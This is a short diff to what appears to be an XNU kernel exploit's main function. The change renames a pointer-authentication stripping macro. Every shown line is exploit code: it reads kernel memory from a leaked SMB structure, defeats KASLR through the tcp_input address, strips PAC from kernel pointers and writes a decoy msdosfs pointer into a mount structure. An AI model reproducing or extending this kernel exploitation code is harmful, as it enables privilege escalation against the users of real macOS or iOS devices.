@@ -356,7 +356,7 @@ int main(void) {
     xe_kmem_read(&nbpcb, (uintptr_t)leaked_smbiod->iod_tdata, sizeof(nbpcb));
     uintptr_t socket = (uintptr_t)nbpcb.nbp_tso;
     uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
-    uintptr_t tcp_input = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET)));
+    uintptr_t tcp_input = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET)));
     xe_log_debug("found tcp_input function address: %p", (void*)tcp_input);
     
     int64_t text_exec_slide = tcp_input - FUNC_TCP_INPUT_ADDR;
@@ -417,10 +417,10 @@ int main(void) {
     uintptr_t vnode_mount_helper = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_helper);
     xe_log_debug("vnode mount helper address: %p", (void*)vnode_mount_helper);
     
-    uintptr_t mount_worker = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t mount_worker = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
     xe_log_debug("mount worker address: %p", (void*)mount_worker);
     
-    uintptr_t mount_helper = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t mount_helper = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
     xe_log_debug("mount helper address: %p", (void*)mount_helper);
     
     uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
@@ -491,7 +491,7 @@ int main(void) {
     error = xe_xnu_proc_find_fd_data(proc, fd_mount_decoy, &vnode_mount_decoy);
     xe_assert_err(error);
     
-    uintptr_t mount_decoy = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t mount_decoy = xe_ptrauth_strip(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET)));
     uintptr_t msdosfs_decoy = xe_kmem_read_uint64(KMEM_OFFSET(mount_decoy, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
     
     xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
